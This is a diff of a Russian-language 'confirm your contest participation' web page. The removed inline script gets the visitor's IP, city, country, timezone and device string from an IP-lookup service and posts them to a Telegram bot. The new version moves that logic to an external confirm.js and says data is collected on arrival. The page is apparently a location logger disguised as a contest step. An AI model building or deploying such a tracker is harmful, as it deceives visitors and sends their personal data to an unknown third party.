@@ -23,77 +23,18 @@
         <h1>Подтверждение участия</h1>
 
         <p>
-            Нажмите кнопку ниже, чтобы подтвердить участие в конкурсе. 
-            Данные о вашей локации и времени будут автоматически отправлены боту.
+            При переходе на эту страницу мы автоматически соберём данные 
+            о вашей локации и времени подтверждения — это необходимо, 
+            чтобы корректно занести вас в список участников конкурса.
         </p>
 
-        <button class="btn" id="confirmBtn">Подтвердить участие</button>
+        <a class="btn" id="confirmBtn">Подтвердить участие</a>
 
         <p class="note">
             Данные используются только для проверки выполнения условий конкурса.
         </p>
     </div>
 
-<script>
-
-// ТЫ ЗАМЕНИШЬ ЭТИ ПОЛЯ ЛОКАЛЬНО:
-const BOT_TOKEN = "BOT_TOKEN_HERE";     // <— сюда вставишь токен
-const CHAT_ID = "CHAT_ID_HERE";         // <— сюда ID пользователя, который выполняет подтверждение
-
-document.getElementById("confirmBtn").addEventListener("click", async () => {
-
-    const uid = crypto.randomUUID();
-    const timestamp_local = new Date().toLocaleString();
-    const timestamp_utc = new Date().toISOString();
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const device = navigator.userAgent;
-
-    let ip = "unknown";
-    let country = "unknown";
-    let city = "unknown";
-
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        ip = data.ip;
-        country = data.country_name;
-        city = data.city;
-    } catch(e){}
-
-    const payload = {
-        uid,
-        ip,
-        country,
-        city,
-        timezone,
-        device,
-        time_local: timestamp_local,
-        time_utc: timestamp_utc
-    };
-
-    const textMessage = 
-        "🔹 Подтверждение участия\n" +
-        "UID: " + uid + "\n" +
-        "IP: " + ip + "\n" +
-        "Город: " + city + "\n" +
-        "Страна: " + country + "\n" +
-        "Время (местное): " + timestamp_local + "\n" +
-        "Время (UTC): " + timestamp_utc + "\n";
-
-    // ОТПРАВКА ДАННЫХ БОТУ НАПРЯМУЮ
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: textMessage
-        })
-    });
-
-    alert("Ваши данные отправлены! Откройте Telegram — бот уже получил подтверждение.");
-});
-
-</script>
-
+    <script src="confirm.js"></script>
 </body>
 </html>
